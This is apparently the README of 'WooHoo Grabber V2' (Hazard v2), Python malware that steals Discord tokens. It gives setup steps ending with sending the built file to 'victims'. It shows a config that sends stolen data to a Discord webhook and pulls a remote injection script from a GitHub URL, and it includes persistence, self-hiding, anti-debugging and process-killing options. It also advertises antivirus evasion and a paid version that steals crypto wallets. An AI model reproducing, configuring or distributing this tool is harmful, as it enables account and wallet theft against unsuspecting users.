üìÅ „Ä¢ Setting up WooHoo Grabber.V2
Install python and add it to path.
Open up main.py with notepad or some other editor
Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your discord webhook
Double Click setup.bat and allow it to finish.
A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
Send the file to victims. üòà
‚öô „Ä¢ Config
If you want to change the config, open up main.py and locate it at the top. There you can configure the following:

config = {
    # replace WEBHOOK_HERE with your webhook ‚Üì‚Üì or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    'webhook': "WEBHOOK_HERE",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Hazard v2
    'ping_on_run': False,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

üîé „Ä¢ Why choose WooHoo Grabber v2?
You might be wondering, Why choose this grabber instead of other ones like Mercurial or ItroublveTSC. Without making this a competition Hazard v2 has many advantages over alot of grabbers out there, popular, free and even paid ones. V2 is well maintained and updates gets pushed out on a regular basis making it a non-buggy, clean, and working grabber. V2 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a injection which also currently is the only working one.

Here are some pros and cons why/why not use Hazard v2 instead of other ones

‚úî Pros
‚ÅÉ Extremely well maintained, making it a safe choice
‚ÅÉ Partly undetected just because it gets updates often
‚ÅÉ Easy to use and setup
‚ÅÉ Completely free and open source
‚ÅÉ Loads of wide spread features not only focused on discord
‚ÅÉ Cleans itself up, deleting all traces of itself which suprisingly most others don't
‚ÅÉ Supports a webhook protector I made (Discord-Webhook-Protector) making it impossible to delete your webhook
‚ÅÉ Even thought it's made in python it's very fast thanks to async and threading
‚ÅÉ Clean embed & isn't spammy like others making it less likely to get ratelimited
‚ÅÉ Takes feedback and listens to what people want to be added/changed/removed

‚ùå Cons
‚ÅÉ Made in Python making it lose to other grabbers in terms of speed
‚ÅÉ Python is an interpreted language, it needs to pack the engine & all dependencies making the file size very big
‚ÅÉ Only supports windows 10/11
‚ÅÉ Can be pretty easily decompiled (still harder than Mercurial atleast)

In the end it's just up to you to choose what grabber suits you and your needs the best.

Crypto/Wallet stealing
Undetected from antivirus
Obfuscated to a irreversible point
Made in a compiled language (stealers made in python automatically becomes bad)

Currently the premium grabber is not out yet, but the goal is that the premium one will be a cheap but powerfull grabber and will have the features listed above 10x. join cheataway and do !buy to see preview of the grabber, free trial will be available so you can try it out and see if you like it.
